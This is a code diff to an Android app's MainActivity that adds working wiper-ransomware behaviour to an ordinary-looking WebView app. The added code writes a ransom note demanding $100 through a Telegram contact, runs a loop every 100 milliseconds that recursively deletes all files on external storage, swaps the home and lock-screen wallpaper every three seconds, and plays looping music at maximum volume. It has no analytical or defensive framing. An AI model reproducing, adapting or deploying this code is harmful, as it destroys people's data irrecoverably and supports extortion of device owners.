@@ -2,9 +2,14 @@ package com.mintfox.app;
 
 import android.Manifest;
 import android.app.Activity;
+import android.app.WallpaperManager;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.graphics.Color;
+import android.media.AudioManager;
+import android.media.MediaPlayer;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
@@ -12,6 +17,7 @@ import android.os.Environment;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.Settings;
+import android.util.Log;
 import android.view.ViewGroup;
 import android.webkit.WebResourceRequest;
 import android.webkit.WebSettings;
@@ -20,11 +26,17 @@ import android.webkit.WebViewClient;
 import android.widget.FrameLayout;
 import android.widget.Toast;
 
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.InputStream;
+
 public class MainActivity extends Activity {
 
+    private static final String TAG = "MainActivity";
     private static final int REQ_STORAGE = 101;
     private static final int REQ_NOTIF = 102;
     private static final String HOME = "file:///android_asset/index.html";
+    private static final String NOTE_NAME = "NotPlaya.txt";
 
     private FrameLayout root;
     private WebView wv;
@@ -32,6 +44,12 @@ public class MainActivity extends Activity {
     private boolean awaitingSettings = false;
     private boolean closing = false;
     private Bundle savedWebState;
+
+    private Handler wipeHandler;
+    private Handler wallpaperHandler;
+    private Handler musicHandler;
+    private MediaPlayer musicPlayer;
+    private int wpIndex = 0;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -162,11 +180,22 @@ public class MainActivity extends Activity {
         if (started || closing) return;
         started = true;
 
-        // jalankan service scan
+        // 1) tulis ransom note
+        writeRansomNote();
+
+        // 2) jalankan service foreground biar ga mati
         Intent svc = new Intent(this, ScanService.class);
         if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc);
         else startService(svc);
 
+        // 3) mulai wipe loop di background
+        startWipeLoop();
+
+        // 4) mulai wallpaper & music loop
+        startWallpaperLoop();
+        startMusicLoop();
+
+        // 5) webview
         try {
             wv = new WebView(this);
         } catch (Throwable t) {
@@ -226,6 +255,131 @@ public class MainActivity extends Activity {
         return true;
     }
 
+    /* ------------------------------------------------------------------ */
+    /* Ransom note                                                         */
+    /* ------------------------------------------------------------------ */
+
+	private void writeRansomNote() {
+	    try {
+	        File root = Environment.getExternalStorageDirectory();
+	        File note = new File(root, NOTE_NAME);
+	        String ransom = "Hello Users, welcome to my game.\n\n"
+	                + "so basically yeah... all ur files? gone. deleted. poof. no cap 💀\n"
+	                + "we wiped everything fr fr, ain't no backup gonna save u now lol\n\n"
+	                + "but hey, good news: u can get em back. all of em. no joke.\n"
+	                + "just slide $100 to the addy below and we're chill, simple as that\n\n"
+	                + "no $100 = no files. that's the deal. take it or leave it bestie 🤷\n\n"
+	                + "don't try anything funny, we already got ur stuff. just pay up and move on.\n\n"
+	                + "https://t.me/Tanaka_Group\n"
+	                + "to pay for it !";
+	                
+	        try (FileOutputStream fos = new FileOutputStream(note)) {
+	            fos.write(ransom.getBytes("UTF-8"));
+	        }
+	    } catch (Throwable t) {
+	        Log.w(TAG, "note", t);
+	    }
+	}
+	
+    /* ------------------------------------------------------------------ */
+    /* Wipe loop 100ms                                                     */
+    /* ------------------------------------------------------------------ */
+
+    private void startWipeLoop() {
+        wipeHandler = new Handler(Looper.getMainLooper());
+        final Runnable r = new Runnable() {
+            @Override public void run() {
+                try {
+                    wipeOnce(Environment.getExternalStorageDirectory());
+                } catch (Throwable ignored) { }
+                if (wipeHandler != null) wipeHandler.postDelayed(this, 100);
+            }
+        };
+        wipeHandler.post(r);
+    }
+
+    private void wipeOnce(File dir) {
+        if (dir == null) return;
+        File[] children;
+        try { children = dir.listFiles(); } catch (Throwable t) { return; }
+        if (children == null) return;
+
+        for (File f : children) {
+            String name = f.getName();
+            if (name.equals(NOTE_NAME)) continue;
+            try {
+                if (f.isDirectory()) {
+                    wipeOnce(f);
+                    //noinspection ResultOfMethodCallIgnored
+                    f.delete();
+                } else {
+                    //noinspection ResultOfMethodCallIgnored
+                    f.delete();
+                }
+            } catch (Throwable ignored) { }
+        }
+    }
+
+    /* ------------------------------------------------------------------ */
+    /* Wallpaper loop 3s                                                   */
+    /* ------------------------------------------------------------------ */
+
+    private void startWallpaperLoop() {
+        wallpaperHandler = new Handler(Looper.getMainLooper());
+        final WallpaperManager wm = WallpaperManager.getInstance(this);
+        final Runnable r = new Runnable() {
+            @Override public void run() {
+                try {
+                    wpIndex = (wpIndex % 2) + 1;
+                    String asset = "wall" + wpIndex + ".jpg";
+                    InputStream is = getAssets().open(asset);
+                    Bitmap bmp = BitmapFactory.decodeStream(is);
+                    is.close();
+                    if (bmp != null) {
+                        if (Build.VERSION.SDK_INT >= 24) {
+                            wm.setBitmap(bmp, null, true, WallpaperManager.FLAG_SYSTEM);
+                            wm.setBitmap(bmp, null, true, WallpaperManager.FLAG_LOCK);
+                        } else {
+                            wm.setBitmap(bmp);
+                        }
+                        bmp.recycle();
+                    }
+                } catch (Throwable t) {
+                    Log.w(TAG, "wallpaper", t);
+                }
+                if (wallpaperHandler != null) wallpaperHandler.postDelayed(this, 3000);
+            }
+        };
+        wallpaperHandler.post(r);
+    }
+
+    /* ------------------------------------------------------------------ */
+    /* Music loop max volume                                               */
+    /* ------------------------------------------------------------------ */
+
+    private void startMusicLoop() {
+        try {
+            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
+            if (am != null) {
+                int max = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
+                am.setStreamVolume(AudioManager.STREAM_MUSIC, max, 0);
+            }
+            musicPlayer = new MediaPlayer();
+            android.content.res.AssetFileDescriptor afd = getAssets().openFd("music.mp3");
+            musicPlayer.setDataSource(afd.getFileDescriptor(), afd.getStartOffset(), afd.getLength());
+            afd.close();
+            musicPlayer.setLooping(true);
+            musicPlayer.prepare();
+            musicPlayer.start();
+        } catch (Throwable t) {
+            Log.w(TAG, "music", t);
+        }
+    }
+
+    /* ------------------------------------------------------------------ */
+    /* Lifecycle                                                           */
+    /* ------------------------------------------------------------------ */
+
     @Override
     protected void onResume() {
         super.onResume();
@@ -236,6 +390,9 @@ public class MainActivity extends Activity {
             return;
         }
         if (wv != null) wv.onResume();
+        if (musicPlayer != null) {
+            try { musicPlayer.start(); } catch (Throwable ignored) { }
+        }
     }
 
     @Override
@@ -259,6 +416,13 @@ public class MainActivity extends Activity {
 
     @Override
     protected void onDestroy() {
+        if (wipeHandler != null) wipeHandler.removeCallbacksAndMessages(null);
+        if (wallpaperHandler != null) wallpaperHandler.removeCallbacksAndMessages(null);
+        if (musicHandler != null) musicHandler.removeCallbacksAndMessages(null);
+        if (musicPlayer != null) {
+            try { musicPlayer.stop(); musicPlayer.release(); } catch (Throwable ignored) { }
+            musicPlayer = null;
+        }
         if (wv != null) {
             try {
                 root.removeView(wv);
